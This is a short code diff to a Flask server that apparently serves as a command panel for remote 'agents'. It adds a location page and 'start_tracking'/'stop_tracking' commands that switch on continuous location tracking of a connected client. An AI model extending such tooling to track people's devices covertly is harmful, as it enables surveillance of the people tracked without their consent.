@@ -164,6 +164,9 @@ def tcp_listener():
 @app.route('/')
 def index(): return render_template('index.html')
 
+@app.route('/location')
+def location_page(): return render_template('location.html')
+
 @app.route('/api/status')
 def get_status():
     with clients_lock:
@@ -220,6 +223,12 @@ def send_command_route():
             client_data['location_status'] = 'requesting'
             client_data['location_image'] = None
             client_data['location_msg'] = 'Sending command to agent...'
+        if cmd == 'start_tracking':
+            client_data['tracking_active'] = True
+            client_data['location_status'] = 'Active'
+        if cmd == 'stop_tracking':
+            client_data['tracking_active'] = False
+            client_data['location_status'] = 'Stopped'
 
     try:
         add_log(f"[SEND] to {client_id}: {cmd}")
